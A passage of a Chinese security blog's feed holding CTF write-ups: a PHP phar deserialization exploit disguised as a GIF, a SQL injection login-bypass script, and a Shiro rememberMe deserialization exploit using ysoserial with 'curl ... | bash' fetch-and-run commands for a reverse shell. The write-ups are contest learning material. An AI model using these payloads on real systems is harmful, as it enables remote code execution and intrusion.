&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Show(<span class="string">'index.php'</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;source = <span class="keyword">$this</span>-&gt;test;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>一般来说，反序列化的入口都可以从<strong>destruct()发起，我们可以看到起调用了一个方法_show()，而这里如果str属性赋值为S6ow的对象，那么就会触发S6ow类的</strong>call魔法方法，而当S6ow调用$name变量(_show)时，又会触发其<strong>get方法，在</strong>get方法中，由于之前访问的不可访问方法，会变为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[<span class="string">'_show'</span>];</span><br></pre></td></tr></table></figure></p><p>那么此时，只要给其赋值为file_get，即可利用echo触发show类的__toString魔法方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">params[<span class="string">'_show'</span>] = <span class="string">'file_get'</span></span><br></pre></td></tr></table></figure></p><p>最终在show类的__toString魔法方法完成利用：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     $text= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">     $text = base64_encode(file_get_contents($text));</span><br><span class="line">     <span class="keyword">return</span> $text;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>赋值source为/flag即可，那么可以构造exp如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sky = <span class="keyword">new</span> Show();</span><br><span class="line">$sky-&gt;source = <span class="string">"/flag"</span>;</span><br><span class="line">$sky1 = <span class="keyword">new</span> S6ow();</span><br><span class="line">$sky1-&gt;params[<span class="string">'_show'</span>] = <span class="string">'file_get'</span>;</span><br><span class="line">$sky1-&gt;file = $sky;</span><br><span class="line">$sky2 = <span class="keyword">new</span> Sh0w();</span><br><span class="line">$sky2-&gt;str = $sky1;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'skyfuck.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.php'</span>, <span class="string">'test'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class="line">$phar-&gt;setMetadata($ss);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'skyfuck.phar'</span>, <span class="string">'skyfuck.gif'</span>);</span><br></pre></td></tr></table></figure></p><p>运行脚本后生成skyfuck.gif，上传后，利用file.php的文件读取，使用phar://去访问该文件，最终可以拿到flag：<br><img src="/images/2019-10-19-13-58-59.png" alt=""></p><h2 id="aweb-1"><a href="#aweb-1" class="headerlink" title="aweb_1"></a>aweb_1</h2><p>拿到题目，发现有注册和登录功能，同时提示只有admin才可以拿到flag，那么猜测是一道二次注入的题目，为了测试方便，写了一个脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.session()</span><br><span class="line">url_signup = <span class="string">'http://47.104.173.173:7002/signup'</span></span><br><span class="line">url_login = <span class="string">'http://47.104.173.173:7002/login'</span></span><br><span class="line">email = <span class="string">'222@3333.com'</span></span><br><span class="line">payload = <span class="string">"admin'or'dddd'='dddd#"</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'email'</span>:email,</span><br><span class="line"><span class="string">'name'</span>:payload,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">s = requests.post(url=url_signup,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Email address already exists'</span> <span class="keyword">in</span> s.content:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Email address already exists.'</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">'Username already exists.'</span> <span class="keyword">in</span> s.content:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Username already exists.'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'email'</span>:email,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">s = requests.post(url_login,data)</span><br><span class="line"><span class="keyword">print</span> s.content</span><br></pre></td></tr></table></figure></p><p>发现题目过滤了空格，那么我们构造”万能密码”，也就是闭合admin为恒真条件，即可拿到flag:<br><img src="/images/2019-10-19-13-58-31.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;lol&quot;&gt;&lt;a href=&quot;#lol&quot; class=&quot;headerlink&quot; title=&quot;lol&quot;&gt;&lt;/a&gt;lol&lt;/h2&gt;&lt;p&gt;拿到题目后，发现有一个上传页面：&lt;br&gt;&lt;img src=&quot;/images/2019-10-19-10-50-10.png&quot; alt
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 OGeek Final &amp; Java Web</title>
    <link href="http://skysec.top/2019/09/28/2019-OGeek-Final-Java-Web/"/>
    <id>http://skysec.top/2019/09/28/2019-OGeek-Final-Java-Web/</id>
    <published>2019-09-28T04:27:37.000Z</published>
    <updated>2019-09-28T07:59:57.794Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间参加了OPPO举办的OGeek网络安全比赛线下赛，遇到一道Java Web，由于不太擅长，只是做了防御没有攻击成功，趁周末复盘一下~</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>拿到题目，发现没有啥功能：<br><img src="/images/2019-09-28-12-30-50.png" alt=""><br>顺势看了一眼源码：<br><img src="/images/2019-09-28-12-32-00.png" alt=""><br>看到shiro后立刻可以想到shiro的反序列化漏洞：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://paper.seebug.org/shiro-rememberme-1-2-4/</span><br></pre></td></tr></table></figure></p><p>可以看到存在漏洞的shiro版本号为：1.2.4，我们查看题目当前版本：<br><img src="/images/2019-09-28-12-34-35.png" alt=""><br>那么显然，是存在shiro反序列化攻击的。</p><h2 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h2><p>查阅相关资料可以知道，该漏洞的利用，涉及如下几个重要的点：</p><ul><li>rememberMe cookie</li><li>CookieRememberMeManager.java</li><li>Base64</li><li>加密算法</li><li>加密密钥硬编码</li><li>Java serialization<br>我们可以知道，攻击的可控点在登录时的RememberMe，但是该值是需要序列化、加密、Base64的，那么很自然的，我们第一步应该是去寻找它对应的加解密算法，我们查看配置文件:<code>webapps/web/WEB-INF/classes/spring-shiro.xml</code>，发现如下关键信息：<br><img src="/images/2019-09-28-12-37-10.png" alt=""><br>可以得知我们的加解密算法位置在ShiroRememberManager类中，我们进行查看：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] getKeyFromConfig() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InputStream fileInputStream = <span class="keyword">this</span>.getClass().getResourceAsStream(<span class="string">"remember.key"</span>);</span><br><span class="line">        String key = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span> (fileInputStream != <span class="keyword">null</span> &amp;&amp; fileInputStream.available() &gt;= <span class="number">32</span>) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[fileInputStream.available()];</span><br><span class="line">            fileInputStream.read(bytes);</span><br><span class="line">            key = <span class="keyword">new</span> String(bytes);</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            BufferedWriter writer = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(<span class="keyword">this</span>.getClass().getResource(<span class="string">"/"</span>).getPath() + <span class="string">"com/collection/shiro/manager/remember.key"</span>));</span><br><span class="line">            key = RandomStringUtils.random(<span class="number">32</span>, <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()_="</span>);</span><br><span class="line">            writer.write(key);</span><br><span class="line">            writer.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        key = (<span class="keyword">new</span> Md5Hash(key)).toString();</span><br><span class="line">        <span class="keyword">return</span> key.getBytes();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">        var4.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>我们关注到关键点：加密密钥硬编码，其密钥位置为：<code>com/collection/shiro/manager/remember.key</code><br>我们可以查看其值为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat remember.key</span><br><span class="line">wR&amp;_(NVG#c&amp;9(CDhaDMZELDmxSe(mwbB</span><br></pre></td></tr></table></figure></p><p>找到了密钥位置，我们去查看一下加解密算法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> CipherService cipherService = <span class="keyword">new</span> ShiroCipherService();</span><br></pre></td></tr></table></figure></p><p>关注到ShiroCipherService类：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">encrypt</span><span class="params">(<span class="keyword">byte</span>[] plaintext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    String sign = (<span class="keyword">new</span> Md5Hash(UUID.randomUUID().toString())).toString() + <span class="string">"asfda-92u134-"</span>;</span><br><span class="line">    Subject subject = SecurityUtils.getSubject();</span><br><span class="line">    HttpServletRequest servletRequest = WebUtils.getHttpRequest(subject);</span><br><span class="line">    String user_agent = servletRequest.getHeader(<span class="string">"User-Agent"</span>);</span><br><span class="line">    String ip_address = servletRequest.getHeader(<span class="string">"X-Forwarded-For"</span>);</span><br><span class="line">    ip_address = ip_address == <span class="keyword">null</span> ? servletRequest.getRemoteAddr() : ip_address;</span><br><span class="line">    String data = <span class="string">"&#123;\"user_is_login\":\"1\",\"sign\":\""</span> + sign + <span class="string">"\",\"ip_address\":\""</span> + ip_address + <span class="string">"\",\"user_agent\":\""</span> + user_agent + <span class="string">"\",\"serialize_data\":\""</span> + Base64.getEncoder().encodeToString(plaintext) + <span class="string">"\"&#125;"</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] data_bytes = data.getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] okey = (<span class="keyword">new</span> Sha1Hash(<span class="keyword">new</span> String(key))).toString().getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] mkey = (<span class="keyword">new</span> Sha1Hash(UUID.randomUUID().toString())).toString().getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] out = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2</span> * data_bytes.length];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data_bytes.length; ++i) &#123;</span><br><span class="line">        out[i * <span class="number">2</span>] = mkey[i % mkey.length];</span><br><span class="line">        out[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="keyword">byte</span>)(mkey[i % mkey.length] ^ data_bytes[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[out.length];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; out.length; ++i) &#123;</span><br><span class="line">        result[i] = (<span class="keyword">byte</span>)(out[i] ^ okey[i % okey.length]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Util.bytes(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以往的加密算法一般为AES，可以发现这里出题人自己编写了一个加密规则，简单看一下，应该是一个异或加密，相应的解密规则也不需要我们编写，出题人也直接给出了解密规则：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] ciphertext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    String skey = (<span class="keyword">new</span> Sha1Hash(<span class="keyword">new</span> String(key))).toString();</span><br><span class="line">    <span class="keyword">byte</span>[] bkey = skey.getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] data_bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[ciphertext.length];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ciphertext.length; ++i) &#123;</span><br><span class="line">        data_bytes[i] = (<span class="keyword">byte</span>)(ciphertext[i] ^ bkey[i % bkey.length]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] jsonData = <span class="keyword">new</span> <span class="keyword">byte</span>[ciphertext.length / <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; jsonData.length; ++i) &#123;</span><br><span class="line">        jsonData[i] = (<span class="keyword">byte</span>)(data_bytes[i * <span class="number">2</span>] ^ data_bytes[i * <span class="number">2</span> + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    JSONObject jsonObject = <span class="keyword">new</span> JSONObject(<span class="keyword">new</span> String(jsonData));</span><br><span class="line">    String serial = (String)jsonObject.get(<span class="string">"serialize_data"</span>);</span><br><span class="line">    <span class="keyword">return</span> Util.bytes(Base64.getDecoder().decode(serial));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但值得注意的是，其中加密算法还是带有一个随机值：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] mkey = (<span class="keyword">new</span> Sha1Hash(UUID.randomUUID().toString())).toString().getBytes();</span><br></pre></td></tr></table></figure></p><p>但该值是用于签名，在解密时，并不会校验签名，所以并没有什么影响。</p><h2 id="Exp编写"><a href="#Exp编写" class="headerlink" title="Exp编写"></a>Exp编写</h2><p>拥有了密钥、加密算法，那么剩下的就是构造我们的exp了，不同往上存在的exp，我们需要自己进行改写exp加密部分，首先我们查看lib文件下：<br><img src="/images/2019-09-28-12-56-27.png" alt=""><br>我们发现使用了commons-collections-3.1.jar，通过ysoserial.jar进行查看：<br><img src="/images/2019-09-28-12-57-45.png" alt=""><br>在内网环境中，攻击目标为：192.168.1.185，而攻击者为192.168.1.230，<br>我们通过ysoserial.jar进行exp构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar JRMPClient &apos;192.168.1.230:22222&apos; | base64 &gt; poc</span><br></pre></td></tr></table></figure></p><p>生成对应exp，然后编写我们的payload加密脚本：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.rngom.parse.host.Base;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.CryptoException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.hash.Md5Hash;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.hash.Sha1Hash;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> org.omg.PortableInterceptor.SYSTEM_EXCEPTION;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String b64_pay = <span class="string">"rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cgAXamF2YS5sYW5nLnJlZmxl\n"</span> +</span><br><span class="line">        <span class="string">"Y3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhh\n"</span> +</span><br><span class="line">        <span class="string">"bmRsZXI7eHBzcgAtamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdEludm9jYXRpb25IYW5kbGVy\n"</span> +</span><br><span class="line">        <span class="string">"AAAAAAAAAAICAAB4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAeHB3\n"</span> +</span><br><span class="line">        <span class="string">"QwAKVW5pY2FzdFJlZgAaY3VybCAxMDYuMTQuMTE0LjEyNyB8IGJhc2gAALXUAAAAADbgqhEAAAAA\n"</span> +</span><br><span class="line">        <span class="string">"AAAAAAAAAAAAAAB4"</span></span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"&#123;\"user_is_login\":\"1\",\"sign\":\"d912fc80c68563b2f5ad7b784d56e0c1asfda-92u134-\",\"ip_address\":\"192.168.1.185\",\"user_agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36\",\"serialize_data\":\""</span>+b64_pay+<span class="string">"\"&#125;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String key = <span class="string">"wR&amp;_(NVG#c&amp;9(CDhaDMZELDmxSe(mwbB"</span>;</span><br><span class="line">        key = (<span class="keyword">new</span> Md5Hash(key)).toString();</span><br><span class="line">        <span class="keyword">byte</span>[] key_b = key.getBytes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//System.out.println(decrypt(cipher_b, key_b));</span></span><br><span class="line">        System.out.println(encrypt(json, key_b));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ByteSource <span class="title">encrypt</span><span class="params">(String data, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data_bytes = data.getBytes();</span><br><span class="line">        <span class="keyword">byte</span>[] okey = (<span class="keyword">new</span> Sha1Hash(<span class="keyword">new</span> String(key))).toString().getBytes();</span><br><span class="line">        <span class="keyword">byte</span>[] mkey = (<span class="keyword">new</span> Sha1Hash(UUID.randomUUID().toString())).toString().getBytes();</span><br><span class="line">        <span class="keyword">byte</span>[] out = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2</span> * data_bytes.length];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data_bytes.length; ++i) &#123;</span><br><span class="line">            out[i * <span class="number">2</span>] = mkey[i % mkey.length];</span><br><span class="line">            out[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="keyword">byte</span>)(mkey[i % mkey.length] ^ data_bytes[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[out.length];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; out.length; ++i) &#123;</span><br><span class="line">            result[i] = (<span class="keyword">byte</span>)(out[i] ^ okey[i % okey.length]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ByteSource.Util.bytes(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行即可生成对应的RememberMe的值，并将该值作为RememberMe的值，放于Cookie中，先运行以下命令，再将请求发送给攻击目标：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 22222 CommonsCollections5 &apos;curl 192.168.1.230 | bash&apos;</span><br></pre></td></tr></table></figure></p><p>即可反弹shell。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>还是对Java不太熟练，比赛的时候，这个漏洞的难度还是低于PHP的（，以后还得加加油</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前段时间参加了OPPO举办的OGeek网络安全比赛线下赛，遇到一道Java Web，由于不太擅长，只是做了防御没有攻击成功，趁周末复盘一下~
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 Trend Micro CTF &amp; Java Web</title>
    <link href="http://skysec.top/2019/09/27/2019-Trend-Micro-CTF-Java-Web/"/>
